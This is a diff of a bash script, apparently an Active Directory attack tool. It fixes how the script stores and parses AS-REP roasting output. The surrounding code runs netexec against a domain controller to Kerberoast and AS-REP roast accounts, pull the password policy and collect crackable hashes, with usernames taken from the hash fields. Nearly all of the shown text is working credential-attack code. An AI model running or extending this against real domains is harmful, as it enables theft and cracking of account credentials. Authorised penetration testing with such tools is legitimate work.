@@ -99,7 +99,7 @@ if [[ -n "$USER" && -n "$PASS" ]]; then
     nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --kerberoasting "$OUT/kerberoast.hash" >"$OUT/kerberoast.log" 2>&1
 
     echo "[*] AS-REP roasting (authenticated, broader than the null-bind sweep)"
-    nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --asreproast "$OUT/asrep.hash" >"$OUT/asrep-auth.log" 2>&1
+    nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --asreproast "$OUT/asrep-auth.hash" >"$OUT/asrep-auth.log" 2>&1
 
     echo "[*] Password/lockout policy"
     nxc smb "$DC_IP" -u "$USER" -p "$PASS" --pass-pol >"$OUT/pass-pol.log" 2>&1
@@ -172,7 +172,9 @@ USERS_FILE="$OUT/users.txt"
     # Kerberoast hash: $krb5tgs$23$*user$realm$spn*$chk$data -- field 4 is "*user", strip the '*'.
     [[ -f "$OUT/kerberoast.hash" ]] && cut -d'$' -f4 "$OUT/kerberoast.hash" 2>/dev/null | sed 's/^\*//'
     # AS-REP hash: $krb5asrep$23$user@REALM:chk$data -- field 4 is "user@REALM:chk", split on '@'.
-    [[ -f "$OUT/asrep.hash" ]] && cut -d'$' -f4 "$OUT/asrep.hash" 2>/dev/null | cut -d'@' -f1
+    for af in "$OUT/asrep.hash" "$OUT/asrep-auth.hash"; do
+        [[ -f "$af" ]] && cut -d'$' -f4 "$af" 2>/dev/null | cut -d'@' -f1
+    done
 } | sed '/^\s*$/d' | sort -u > "$USERS_FILE"
 echo "[*] Deduplicated usernames -> $USERS_FILE ($(wc -l <"$USERS_FILE" 2>/dev/null || echo 0) found)"
 
@@ -180,7 +182,7 @@ echo
 echo "=================== SUMMARY: $DC_IP ($DOMAIN) ==================="
 echo "Hash files and how to crack them:"
 FOUND_ANY=0
-for hf in "$OUT/kerberoast.hash" "$OUT/asrep.hash" "$OUT/timeroast.hash"; do
+for hf in "$OUT/kerberoast.hash" "$OUT/asrep.hash" "$OUT/asrep-auth.hash" "$OUT/timeroast.hash"; do
     if [[ -s "$hf" ]]; then
         FOUND_ANY=1
         COUNT="$(grep -c . "$hf" 2>/dev/null || echo 0)"
